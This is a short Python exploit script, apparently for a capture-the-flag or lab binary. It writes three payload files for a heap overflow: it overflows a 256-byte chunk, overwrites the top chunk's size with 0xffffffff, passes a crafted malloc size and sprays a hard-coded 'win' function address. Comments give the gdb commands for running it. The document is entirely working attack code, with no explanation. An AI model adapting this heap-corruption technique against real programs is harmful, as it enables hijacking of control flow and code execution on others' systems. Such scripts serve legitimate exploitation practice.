import struct
import ctypes

win = 0x804850b
evil_size = "0xb7fb3a4c"
max_value = 0xffffffff

word_size = ctypes.sizeof(ctypes.c_ulong)

#1 BOF (1 Malloc + Prev_Size + Size)
#prev_size (4 byte = 1 word) - Size (4 byte = 1 word)
atk_vector1 = 'a' *256 + 'g' * word_size + struct.pack("I", max_value) #size #argv[1]

atk_vector2 = evil_size #argv[2]

#2 BOF
atk_vector3 = struct.pack("I", win) * (256/word_size) #argv[3]

f = open("badfile1", "w+")
f.write(atk_vector1)
f.close()

f = open("badfile2", "w+")
f.write(atk_vector2)
f.close()

f = open("badfile3", "w+")
f.write(atk_vector3)
f.close()

# r $(cat badfile1) $(cat badfile2) $(cat badfile3)
# b * 0x08048704

#print atk_vector1 + " " + atk_vector2 + " " + atk_vector3
